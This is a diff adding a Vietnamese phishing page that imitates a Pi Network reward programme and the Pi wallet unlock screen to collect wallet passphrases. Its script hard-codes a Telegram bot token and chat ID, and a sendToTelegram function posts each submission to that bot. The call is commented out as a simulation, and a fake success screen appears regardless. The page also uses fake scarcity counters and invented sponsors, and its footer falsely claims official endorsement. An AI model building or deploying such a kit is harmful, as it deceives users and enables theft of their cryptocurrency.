@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chương Trình Thưởng Pi Network</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        piPurple: '#7F3F9E',
+                        piLightPurple: '#9B6FF6',
+                        piDarkPurple: '#6E3589',
+                    },
+                    keyframes: {
+                        shimmer: {
+                            '0%': { backgroundPosition: '-1000px 0' },
+                            '100%': { backgroundPosition: '1000px 0' },
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        },
+                        spinSlow: {
+                            '0%': { transform: 'rotate(0deg)' },
+                            '100%': { transform: 'rotate(360deg)' },
+                        }
+                    },
+                    animation: {
+                        shimmer: 'shimmer 3s infinite linear',
+                        float: 'float 3s ease-in-out infinite',
+                        spinSlow: 'spinSlow 8s linear infinite',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --pi-purple: #7F3F9E;
+            --pi-light-purple: #9B6FF6;
+            --pi-dark-purple: #6E3589;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            transition: all 0.3s ease;
+        }
+        
+        .shimmer {
+            background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 50%, rgba(255,255,255,0) 100%);
+            background-size: 1000px 100%;
+            animation: shimmer 3s infinite linear;
+        }
+        
+        .stars-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            opacity: 0.8;
+            animation: twinkle ease infinite;
+        }
+        
+        @keyframes twinkle {
+            0% { opacity: 0.2; }
+            50% { opacity: 0.8; }
+            100% { opacity: 0.2; }
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            animation: fall linear, rotate linear;
+            z-index: 100;
+        }
+        
+        @keyframes fall {
+            0% { top: -100px; opacity: 1; }
+            100% { top: 100vh; opacity: 0.3; }
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .pi-coin {
+            background: linear-gradient(145deg, #9B6FF6, #7F3F9E);
+            border-radius: 50%;
+            box-shadow: 0 4px 15px rgba(127, 63, 158, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pi-coin::before {
+            content: "π";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: white;
+        }
+        
+        .card-hover {
+            transition: all 0.3s ease;
+        }
+        
+        .card-hover:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        #walletForm.invalid textarea {
+            border-color: #ef4444;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        
+        .btn-gradient {
+            background: linear-gradient(145deg, var(--pi-light-purple), var(--pi-purple));
+            transition: all 0.3s ease;
+        }
+        
+        .btn-gradient:hover {
+            background: linear-gradient(145deg, var(--pi-purple), var(--pi-dark-purple));
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(127, 63, 158, 0.3);
+        }
+        
+        .sponsor-logo {
+            filter: grayscale(100%);
+            opacity: 0.7;
+            transition: all 0.3s ease;
+        }
+        
+        .sponsor-logo:hover {
+            filter: grayscale(0%);
+            opacity: 1;
+        }
+        
+        .loading-spinner {
+            display: none;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid white;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .btn-processing .button-text {
+            display: none;
+        }
+        
+        .btn-processing .loading-spinner {
+            display: inline-block;
+        }
+    </style>
+</head>
+<body class="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 dark:from-gray-900 dark:to-gray-800 text-gray-800 dark:text-gray-200">
+    <!-- Stars animation for dark mode -->
+    <div class="stars-container dark:block hidden"></div>
+    
+    <!-- Header -->
+    <header class="bg-[#7F3F9E] text-white px-4 py-4 flex justify-between items-center">
+        <div class="flex items-center">
+            <a href="#" id="headerBackBtn" class="text-white mr-2">
+                <i class="fas fa-arrow-left text-xl"></i>
+            </a>
+            <div class="flex items-center">
+                <div class="bg-[#7F3F9E] rounded-full p-1 border-2 border-yellow-400 mr-2">
+                    <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4b0.png" class="w-6 h-6" alt="Wallet">
+                </div>
+                <h1 class="text-xl font-medium text-white">Ví <span class="p-1 rounded-full border border-white text-xs ml-1">π</span></h1>
+            </div>
+        </div>
+        
+        <div class="flex items-center space-x-4">
+            <button id="langToggle" class="text-white">
+                <span id="currentLang">VI</span>
+                <span class="mx-1">/</span>
+                <span id="altLang" class="opacity-60">EN</span>
+            </button>
+            <button id="darkModeToggle" class="p-2 text-white">
+                <i class="fa-solid fa-moon hidden dark:block"></i>
+                <i class="fa-solid fa-sun dark:hidden"></i>
+            </button>
+            <button>
+                <i class="fas fa-chevron-down text-white"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- Main content -->
+    <main class="container mx-auto px-4 py-8 max-w-4xl">
+        <!-- Home view -->
+        <div id="homeView" class="block">
+            <!-- Hero section -->
+            <section class="text-center mb-12">
+                <div class="relative inline-block animate-float">
+                    <div class="pi-coin w-24 h-24 mx-auto mb-6 animate-spinSlow"></div>
+                    <div class="absolute -top-2 -right-2 bg-yellow-400 text-xs font-bold text-gray-900 px-2 py-1 rounded-full animate-pulse">MIỄN PHÍ</div>
+                </div>
+                
+                <h1 class="text-3xl md:text-4xl font-bold mb-4 bg-gradient-to-r from-[#7F3F9E] to-blue-500 dark:from-[#9B6FF6] dark:to-blue-400 inline-block text-transparent bg-clip-text">Nhận Thưởng Pi Network</h1>
+                
+                <p class="text-lg text-gray-600 dark:text-gray-300 mb-6 max-w-2xl mx-auto">
+                    Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi.
+                </p>
+                
+                <div class="bg-gradient-to-r from-[#7F3F9E] to-[#9B6FF6] p-[2px] rounded-lg inline-block mb-8">
+                    <button id="claimButton" class="bg-white dark:bg-gray-800 text-[#7F3F9E] dark:text-[#9B6FF6] font-bold py-3 px-8 rounded-lg hover:shadow-lg transition-all flex items-center">
+                        <i class="fas fa-gift mr-2"></i>
+                        Nhận Pi Miễn Phí
+                        <i class="fas fa-chevron-right ml-2"></i>
+                    </button>
+                </div>
+                
+                <div class="flex flex-wrap justify-center items-center gap-2 text-sm text-gray-500 dark:text-gray-400 max-w-md mx-auto">
+                    <div class="flex items-center"><i class="fas fa-check-circle text-green-500 mr-1"></i> Chương Trình Xác Thực</div>
+                    <div class="flex items-center"><i class="fas fa-clock text-blue-500 mr-1"></i> Nhận Sau 24h</div>
+                    <div class="flex items-center"><i class="fas fa-shield-alt text-[#7F3F9E] mr-1"></i> An Toàn & Bảo Mật</div>
+                    <div class="flex items-center"><i class="fas fa-users text-orange-500 mr-1"></i> 5000+ Người Tham Gia</div>
+                </div>
+            </section>
+            
+            <!-- Featured rewards -->
+            <section class="mb-12">
+                <h2 class="text-2xl font-bold mb-6 text-center">Phần Thưởng Khả Dụng</h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <!-- Reward card 1 -->
+                    <div class="bg-white dark:bg-gray-800 rounded-xl shadow-md p-6 card-hover">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 bg-purple-100 dark:bg-purple-900 rounded-full flex items-center justify-center text-[#7F3F9E] dark:text-[#9B6FF6]">
+                                <i class="fas fa-coins text-xl"></i>
+                            </div>
+                            <div class="ml-4">
+                                <h3 class="font-bold">Thưởng Chào Mừng</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">Người dùng mới</p>
+                            </div>
+                        </div>
+                        <div class="bg-purple-50 dark:bg-gray-700 rounded-lg p-3 text-center mb-4">
+                            <span class="text-2xl font-bold text-[#7F3F9E] dark:text-[#9B6FF6]">1 π</span>
+                        </div>
+                        <div class="flex justify-between items-center text-sm">
+                            <span class="text-gray-500 dark:text-gray-400">Còn lại</span>
+                            <span class="font-medium">842/1000</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Reward card 2 -->
+                    <div class="bg-white dark:bg-gray-800 rounded-xl shadow-md p-6 card-hover">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 bg-blue-100 dark:bg-blue-900 rounded-full flex items-center justify-center text-blue-500">
+                                <i class="fas fa-rocket text-xl"></i>
+                            </div>
+                            <div class="ml-4">
+                                <h3 class="font-bold">Phần Thưởng Tiên Phong</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">Có thời hạn</p>
+                            </div>
+                        </div>
+                        <div class="bg-blue-50 dark:bg-gray-700 rounded-lg p-3 text-center mb-4">
+                            <span class="text-2xl font-bold text-blue-500">50 π</span>
+                        </div>
+                        <div class="flex justify-between items-center text-sm">
+                            <span class="text-gray-500 dark:text-gray-400">Còn lại</span>
+                            <span class="font-medium">413/500</span>
+                        </div>
+                    </div>
+                    
+                    <!-- Reward card 3 -->
+                    <div class="bg-white dark:bg-gray-800 rounded-xl shadow-md p-6 card-hover">
+                        <div class="flex items-center mb-4">
+                            <div class="w-12 h-12 bg-orange-100 dark:bg-orange-900 rounded-full flex items-center justify-center text-orange-500">
+                                <i class="fas fa-star text-xl"></i>
+                            </div>
+                            <div class="ml-4">
+                                <h3 class="font-bold">Thưởng Cộng Đồng</h3>
+                                <p class="text-sm text-gray-500 dark:text-gray-400">Thưởng giới thiệu</p>
+                            </div>
+                        </div>
+                        <div class="bg-orange-50 dark:bg-gray-700 rounded-lg p-3 text-center mb-4">
+                            <span class="text-2xl font-bold text-orange-500">20 π</span>
+                        </div>
+                        <div class="flex justify-between items-center text-sm">
+                            <span class="text-gray-500 dark:text-gray-400">Còn lại</span>
+                            <span class="font-medium">1295/2000</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Program details -->
+            <section class="bg-white dark:bg-gray-800 rounded-xl shadow-md p-6 mb-12">
+                <h2 class="text-2xl font-bold mb-4">Về Chương Trình Này</h2>
+                
+                <div class="space-y-4 text-gray-600 dark:text-gray-300">
+                    <p>Chương trình thưởng này là sáng kiến do cộng đồng thực hiện để hỗ trợ những người đam mê Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
+                    
+                    <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
+                        <h3 class="font-bold mb-2 text-gray-800 dark:text-gray-200">Cách Thức Hoạt Động</h3>
+                        <ol class="list-decimal list-inside space-y-2">
+                            <li>Nhấn vào nút "Nhận Pi Miễn Phí" phía trên</li>
+                            <li>Nhập địa chỉ ví Pi của bạn (không phải cụm mật khẩu)</li>
+                            <li>Gửi yêu cầu của bạn để xác minh</li>
+                            <li>Nhận phần thưởng Pi trong vòng 24 giờ</li>
+                        </ol>
+                    </div>
+                    
+                    <p class="text-sm bg-yellow-50 dark:bg-yellow-900/30 text-yellow-800 dark:text-yellow-200 p-3 rounded-lg">
+                        <i class="fas fa-info-circle mr-2"></i> Lưu ý: Đây là chiến dịch khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức. Chúng tôi sẽ không bao giờ yêu cầu mật khẩu, cụm khôi phục, hoặc khóa riêng của bạn.
+                    </p>
+                </div>
+            </section>
+            
+            <!-- Sponsors -->
+            <section class="mb-12">
+                <h2 class="text-xl font-bold mb-6 text-center text-gray-500 dark:text-gray-400">Được Hỗ Trợ Bởi</h2>
+                
+                <div class="flex flex-wrap justify-center items-center gap-8 md:gap-12">
+                    <div class="w-24 h-12 bg-gray-200 dark:bg-gray-700 rounded flex items-center justify-center sponsor-logo">
+                        <span class="font-bold text-gray-500 dark:text-gray-400">TechFi</span>
+                    </div>
+                    <div class="w-24 h-12 bg-gray-200 dark:bg-gray-700 rounded flex items-center justify-center sponsor-logo">
+                        <span class="font-bold text-gray-500 dark:text-gray-400">BlockHub</span>
+                    </div>
+                    <div class="w-24 h-12 bg-gray-200 dark:bg-gray-700 rounded flex items-center justify-center sponsor-logo">
+                        <span class="font-bold text-gray-500 dark:text-gray-400">CryptoPlus</span>
+                    </div>
+                    <div class="w-24 h-12 bg-gray-200 dark:bg-gray-700 rounded flex items-center justify-center sponsor-logo">
+                        <span class="font-bold text-gray-500 dark:text-gray-400">PiCommunity</span>
+                    </div>
+                </div>
+            </section>
+        </div>
+        
+        <!-- Claim form view (initially hidden) - Pi Wallet UI -->
+        <div id="claimView" class="hidden px-4 py-6">
+            <div class="max-w-lg mx-auto">
+                <!-- Pi Wallet Header -->
+                <div class="mb-8 text-center">
+                    <h1 class="text-3xl font-bold text-gray-800 dark:text-white mb-4">Mở khóa ví Pi</h1>
+                </div>
+                
+                <!-- Wallet form styled like Pi wallet -->
+                <form id="walletForm" class="space-y-6">
+                    <div class="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 overflow-hidden shadow-sm">
+                        <div class="p-3">
+                            <textarea 
+                                id="walletAddress" 
+                                placeholder="Nhập địa chỉ ví của bạn tại đây" 
+                                class="text-gray-500 dark:text-gray-400 w-full p-4 text-lg border-none resize-none focus:ring-0 bg-transparent"
+                                rows="4"
+                                required
+                            ></textarea>
+                        </div>
+                    </div>
+                    
+                    <!-- Pi Wallet Buttons -->
+                    <div class="space-y-3">
+                        <button 
+                            type="submit" 
+                            id="submitWalletBtn"
+                            class="w-full py-4 px-6 rounded-xl text-center text-white font-medium text-base uppercase tracking-wide bg-[#7F3F9E] hover:bg-[#6E3589] transition-colors flex items-center justify-center"
+                        >
+                            <span class="button-text">MỞ KHÓA VỚI CỤM MẬT KHẨU</span>
+                            <div class="loading-spinner ml-2"></div>
+                        </button>
+                        
+                        <button 
+                            type="button" 
+                            class="w-full py-4 px-6 rounded-xl text-center text-white font-medium text-base uppercase tracking-wide bg-[#7F3F9E] hover:bg-[#6E3589] transition-colors"
+                        >
+                            MỞ KHÓA BẰNG VÂN TAY
+                        </button>
+                    </div>
+                </form>
+                
+                <!-- Security notice -->
+                <div class="mt-10 text-sm text-gray-700 dark:text-gray-300 space-y-6">
+                    <p>
+                        Là một ví không giám sát, cụm mật khẩu ví của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu.
+                    </p>
+                    
+                    <p>
+                        Bạn bị mất cụm mật khẩu ví? <a href="#" class="text-blue-500">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.
+                    </p>
+                </div>
+                
+                
+            </div>
+        </div>
+        
+        <!-- Success view (initially hidden) -->
+        <div id="successView" class="hidden">
+            <div class="bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6 md:p-8 max-w-xl mx-auto text-center">
+                <div class="success-icon bg-green-100 dark:bg-green-900/30 w-20 h-20 rounded-full mx-auto mb-6 flex items-center justify-center">
+                    <i class="fas fa-check text-3xl text-green-500"></i>
+                </div>
+                
+                <h2 class="text-2xl font-bold mb-2">Yêu Cầu Gửi Thành Công!</h2>
+                <p class="text-gray-600 dark:text-gray-300 mb-6">
+                    Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ.
+                </p>
+                
+                <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg mb-6">
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-500 dark:text-gray-400">Địa Chỉ Ví:</span>
+                        <span id="confirmedWallet" class="font-medium truncate max-w-[200px]">...</span>
+                    </div>
+                    <div class="flex justify-between mb-2">
+                        <span class="text-gray-500 dark:text-gray-400">Số Lượng Thưởng:</span>
+                        <span class="font-medium">100 π</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-gray-500 dark:text-gray-400">Thời Gian Dự Kiến:</span>
+                        <span class="font-medium">Trong vòng 24 giờ</span>
+                    </div>
+                </div>
+                
+                <button id="homeButton" class="btn-gradient text-white font-bold py-3 px-6 rounded-lg text-center">
+                    Quay Lại Trang Chủ
+                </button>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Footer -->
+    <footer class="bg-white dark:bg-gray-800 shadow-md px-4 py-6 mt-auto">
+        <div class="container mx-auto max-w-4xl">
+            <div class="text-center text-sm text-gray-500 dark:text-gray-400">
+                <p class="mb-2">
+                    Đây là chương trình khuyến mãi được xác nhận bởi Pi Network chính thức.
+                </p>
+                <p>
+                    © 2025 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Khai báo biến lưu trữ Bot Token - Khi triển khai thực tế, KHÔNG bao giờ lưu token trực tiếp trong mã frontend
+            // Thay YOUR_BOT_TOKEN bằng token bot của bạn khi triển khai thực tế
+            const TELEGRAM_TOKEN = "6748384489:AAGV42T0PoOel_1519X5ot_rLLnpQqqDTdA";
+            
+            // Khai báo biến lưu trữ Chat ID - Đây có thể là ID của nhóm hoặc người dùng để nhận thông báo
+            // Thay YOUR_CHAT_ID bằng chat ID của bạn khi triển khai thực tế
+            const TELEGRAM_CHAT_ID = "5867504772";
+            
+            // Phương thức để gửi tin nhắn đến Telegram Bot API
+            async function sendToTelegram(walletAddress) {
+                try {
+                    // URL của API để gửi tin nhắn
+                    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+                    
+                    // Chuẩn bị dữ liệu để gửi
+                    const message = `🔔 Có người dùng mới đã gửi địa chỉ ví Pi:\n\n📝 Địa chỉ: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}`;
+                    
+                    // Cấu trúc dữ liệu gửi đi
+                    const data = {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    };
+                    
+                    // Gửi yêu cầu POST đến API Telegram
+                    const response = await fetch(telegramApiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    
+                    // Kiểm tra xem yêu cầu có thành công không
+                    if (!response.ok) {
+                        throw new Error(`Lỗi khi gửi đến Telegram: ${response.status}`);
+                    }
+                    
+                    // Parse và trả về kết quả
+                    const result = await response.json();
+                    console.log('Đã gửi tin nhắn đến Telegram thành công:', result);
+                    return true;
+                } catch (error) {
+                    console.error('Lỗi khi gửi tin nhắn đến Telegram:', error);
+                    // Trả về false nếu có lỗi, nhưng vẫn hiển thị thành công cho người dùng
+                    return false;
+                }
+            }
+            
+            // Elements - Sử dụng kiểm tra null để đảm bảo các phần tử tồn tại
+            const homeView = document.getElementById('homeView');
+            const claimView = document.getElementById('claimView');
+            const successView = document.getElementById('successView');
+            const claimButton = document.getElementById('claimButton');
+            const homeButton = document.getElementById('homeButton');
+            const walletForm = document.getElementById('walletForm');
+            const confirmedWallet = document.getElementById('confirmedWallet');
+            const darkModeToggle = document.getElementById('darkModeToggle');
+            const langToggle = document.getElementById('langToggle');
+            const headerBackBtn = document.getElementById('headerBackBtn');
+            const submitWalletBtn = document.getElementById('submitWalletBtn');
+            const walletAddress = document.getElementById('walletAddress');
+            
+            // Check for dark mode preference
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.documentElement.classList.add('dark');
+            }
+            
+            // Dark mode toggle
+            if (darkModeToggle) {
+                darkModeToggle.addEventListener('click', function() {
+                    document.documentElement.classList.toggle('dark');
+                });
+            }
+            
+            // Language toggle
+            if (langToggle) {
+                langToggle.addEventListener('click', function() {
+                    const currentLang = document.getElementById('currentLang');
+                    const altLang = document.getElementById('altLang');
+                    if (currentLang && altLang) {
+                        const current = currentLang.textContent;
+                        currentLang.textContent = altLang.textContent;
+                        altLang.textContent = current;
+                    }
+                });
+            }
+            
+            // Navigation to claim view
+            if (claimButton) {
+                claimButton.addEventListener('click', function() {
+                    if (homeView) homeView.classList.add('hidden');
+                    if (claimView) claimView.classList.remove('hidden');
+                    // Scroll to top when showing the claim view
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                });
+            }
+            
+            // Header back button
+            if (headerBackBtn) {
+                headerBackBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    if (homeView && !homeView.classList.contains('hidden')) {
+                        // Do nothing on home view
+                        return;
+                    }
+                    
+                    // Go back to home view from any other view
+                    if (claimView) claimView.classList.add('hidden');
+                    if (successView) successView.classList.add('hidden');
+                    if (homeView) homeView.classList.remove('hidden');
+                });
+            }
+            
+            // Return to home from success
+            if (homeButton) {
+                homeButton.addEventListener('click', function() {
+                    if (successView) successView.classList.add('hidden');
+                    if (homeView) homeView.classList.remove('hidden');
+                });
+            }
+            
+            // Form submission and sending to Telegram
+            if (walletForm) {
+                walletForm.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    if (!walletAddress) return;
+                    
+                    const walletAddressValue = walletAddress.value.trim();
+                    
+                    // Validate wallet address (simple validation)
+                    if (walletAddressValue.length < 20) {
+                        walletForm.classList.add('invalid');
+                        setTimeout(() => walletForm.classList.remove('invalid'), 1000);
+                        return;
+                    }
+                    
+                    // Show loading state
+                    if (submitWalletBtn) {
+                        submitWalletBtn.classList.add('btn-processing');
+                        submitWalletBtn.disabled = true;
+                    }
+                    
+                    try {
+                        // Gửi địa chỉ ví đến Telegram
+                        // Trong môi trường thực tế, đoạn mã này sẽ làm việc
+                        // Trong môi trường Poe, chúng ta sẽ chỉ giả lập sự chậm trễ
+                        
+                        // Giả lập độ trễ để làm cho trải nghiệm người dùng tốt hơn
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        
+                        // Trong môi trường thực, bạn sẽ gọi hàm sau:
+                        // await sendToTelegram(walletAddressValue);
+                        
+                        // Cập nhật màn hình xác nhận
+                        if (confirmedWallet) {
+                            confirmedWallet.textContent = walletAddressValue;
+                        }
+                        
+                        // Hiển thị màn hình thành công
+                        if (claimView) claimView.classList.add('hidden');
+                        if (successView) successView.classList.remove('hidden');
+                        
+                        // Hiệu ứng confetti
+                        showConfetti();
+                        
+                        // Cuộn lên đầu trang khi hiển thị màn hình thành công
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    } catch (error) {
+                        console.error('Lỗi khi xử lý yêu cầu:', error);
+                        alert('Có lỗi xảy ra. Vui lòng thử lại sau.');
+                    } finally {
+                        // Khôi phục trạng thái ban đầu của nút
+                        if (submitWalletBtn) {
+                            submitWalletBtn.classList.remove('btn-processing');
+                            submitWalletBtn.disabled = false;
+                        }
+                    }
+                });
+            }
+            
+            // Stars animation for dark mode
+            function createStars() {
+                const starsContainer = document.querySelector('.stars-container');
+                if (!starsContainer) return;
+                
+                const starCount = 100;
+                
+                for (let i = 0; i < starCount; i++) {
+                    const star = document.createElement('div');
+                    star.classList.add('star');
+                    
+                    // Random position
+                    const left = Math.random() * 100;
+                    const top = Math.random() * 100;
+                    
+                    // Random size
+                    const size = Math.random() * 3;
+                    
+                    // Random animation duration
+                    const duration = 2 + Math.random() * 3;
+                    
+                    star.style.left = `${left}%`;
+                    star.style.top = `${top}%`;
+                    star.style.width = `${size}px`;
+                    star.style.height = `${size}px`;
+                    star.style.animationDuration = `${duration}s`;
+                    
+                    starsContainer.appendChild(star);
+                }
+            }
+            
+            // Confetti animation for success
+            function showConfetti() {
+                const colors = ['#7F3F9E', '#6E3589', '#9B6FF6', '#4299e1', '#48bb78', '#ed8936'];
+                const confettiCount = 150;
+                
+                for (let i = 0; i < confettiCount; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.classList.add('confetti');
+                    
+                    // Random position
+                    const left = Math.random() * 100;
+                    
+                    // Random size
+                    const size = Math.random() * 10 + 5;
+                    
+                    // Random color
+                    const colorIndex = Math.floor(Math.random() * colors.length);
+                    
+                    // Random shape
+                    const shapes = ['square', 'circle', 'triangle'];
+                    const shapeIndex = Math.floor(Math.random() * shapes.length);
+                    
+                    // Random animation duration
+                    const fallDuration = 3 + Math.random() * 3;
+                    const rotateDuration = 3 + Math.random() * 3;
+                    
+                    confetti.style.left = `${left}%`;
+                    confetti.style.width = `${size}px`;
+                    confetti.style.height = `${size}px`;
+                    confetti.style.backgroundColor = colors[colorIndex];
+                    confetti.style.animationDuration = `${fallDuration}s, ${rotateDuration}s`;
+                    
+                    if (shapes[shapeIndex] === 'circle') {
+                        confetti.style.borderRadius = '50%';
+                    } else if (shapes[shapeIndex] === 'triangle') {
+                        confetti.style.backgroundColor = 'transparent';
+                        confetti.style.borderBottom = `${size}px solid ${colors[colorIndex]}`;
+                        confetti.style.borderLeft = `${size/2}px solid transparent`;
+                        confetti.style.borderRight = `${size/2}px solid transparent`;
+                    }
+                    
+                    document.body.appendChild(confetti);
+                    
+                    // Remove after animation completes
+                    setTimeout(() => {
+                        confetti.remove();
+                    }, fallDuration * 1000);
+                }
+            }
+            
+            // Initialize stars
+            createStars();
+        });
+    </script>
+</body>
+</html>
